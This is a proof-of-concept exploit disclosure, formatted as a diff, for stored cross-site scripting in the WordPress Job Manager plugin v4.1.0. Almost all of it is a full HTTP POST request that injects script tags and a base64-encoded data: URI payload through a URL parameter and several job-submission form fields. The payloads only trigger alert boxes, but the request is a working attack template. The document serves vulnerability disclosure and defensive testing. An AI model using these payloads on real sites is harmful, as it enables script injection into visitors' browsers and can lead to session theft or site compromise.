@@ -1,0 +1,102 @@
+# Exploit Title: Wordpress Plugin Job Manager v4.1.0 Stored Cross Site
+Scripting
+# Google Dork: N/A
+# Date: 2018-07-15
+# Exploit Author: Berk Dusunur & Selimcan Ozdemir
+# Vendor Homepage: https://wpjobmanager.com
+# Software Link: https://downloads.wordpress.org/plugin/wp-job-manager.latest-stable.zip
+# Affected Version: v4.1.0
+# Tested on: Parrot OS / WinApp Server
+# CVE : N/A
+
+# Proof Of Concept
+
+
+POST
+/post-a-job/?step=%00foymtv%22%20method=%22post%22%20id=%22submit-job-form%22%20class=%22job-manager-form%22%20enctype=%22multipart/form-data%22%3E%3Cscript%3Ealert(%271%27)%3C/script%3E%3Cform%20action=%22/post-a-job/?step=%00foymtv
+HTTP/1.1
+Host: target
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101
+Firefox/59.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer:
+https://target/post-a-job/?step=%00foymtv22%20method=%22post%22%20id=%22submit-job-form%22%20class=%22job-manager-form%22%20enctype=%22multipart/form-data%22%3E%3Cscript%3Ealert(%271%27)%3C/script%3E%3Cform%20action=%22/post-a-job/?step=%00foymtv
+Content-Type: multipart/form-data;
+boundary=---------------------------3756777582569023921817540904
+Content-Length: 2379
+Cookie: wp-job-manager-submitting-job-id=88664;
+wp-job-manager-submitting-job-key=5ae8875580aff
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+
+-----------------------------3756777582569023921817540904
+Content-Disposition: form-data; name="job_title"
+
+teertert</p></body><script>alert('1')</script>
+-----------------------------3756777582569023921817540904
+Content-Disposition: form-data; name="job_description"
+
+test</p></div></div><form input=""><p></p><script>alert('1')</script><a
+href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">test</a>
+-----------------------------3756777582569023921817540904
+Content-Disposition: form-data; name="job_region"
+
+184
+-----------------------------3756777582569023921817540904
+Content-Disposition: form-data; name="job_type"
+
+2
+-----------------------------3756777582569023921817540904
+Content-Disposition: form-data; name="application"
+
+www.google.com
+-----------------------------3756777582569023921817540904
+Content-Disposition: form-data; name="job_location"
+
+Adelaide, Australia
+-----------------------------3756777582569023921817540904
+Content-Disposition: form-data; name="company_name"
+
+teertert</p></body><script>alert('1')</script>
+-----------------------------3756777582569023921817540904
+Content-Disposition: form-data; name="company_tagline"
+
+teertert</p></body><script>alert('1')</script>
+-----------------------------3756777582569023921817540904
+Content-Disposition: form-data; name="company_website"
+
+www.google.com
+-----------------------------3756777582569023921817540904
+Content-Disposition: form-data; name="company_logo"; filename=""
+Content-Type: application/octet-stream
+
+
+-----------------------------3756777582569023921817540904
+Content-Disposition: form-data; name="company_poster_name"
+
+teertert</p></body><script>alert('1')</script>
+-----------------------------3756777582569023921817540904
+Content-Disposition: form-data; name="company_poster_email"
+
+xssiletarihyazilmaz@gmail.com
+-----------------------------3756777582569023921817540904
+Content-Disposition: form-data; name="job_manager_form"
+
+submit-job
+-----------------------------3756777582569023921817540904
+Content-Disposition: form-data; name="job_id"
+
+0
+-----------------------------3756777582569023921817540904
+Content-Disposition: form-data; name="step"
+
+
+-----------------------------3756777582569023921817540904
+Content-Disposition: form-data; name="submit_job"
+
+Preview
+-----------------------------3756777582569023921817540904--
